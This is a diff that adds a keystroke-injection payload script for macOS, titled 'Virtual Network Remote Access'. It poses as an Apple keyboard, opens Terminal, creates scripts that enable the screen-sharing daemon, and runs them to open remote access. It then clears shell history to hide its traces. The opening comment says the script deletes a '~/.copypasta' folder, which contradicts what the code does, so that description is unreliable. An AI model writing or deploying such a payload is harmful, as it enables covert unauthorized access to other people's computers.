@@ -1,0 +1,36 @@
+REM Deletes the hidden folder ~/.copypasta
+REM To be used with copy pasta script
+
+
+REM Author: Narsty
+REM Title: Virtual Network Remote Access
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir /tmp/phantom_vnc && cd /tmp/phantom_vnc
+ENTER
+DELAY 500
+STRING echo 'launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist' > vnc_start.sh
+ENTER
+DELAY 500
+STRING echo 'launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist' > vnc_stop.sh
+ENTER
+DELAY 500
+STRING chmod +x vnc_start.sh vnc_stop.sh
+ENTER
+DELAY 500
+STRING ./vnc_start.sh
+ENTER
+DELAY 500
+STRING history -c && exit
+ENTER
+
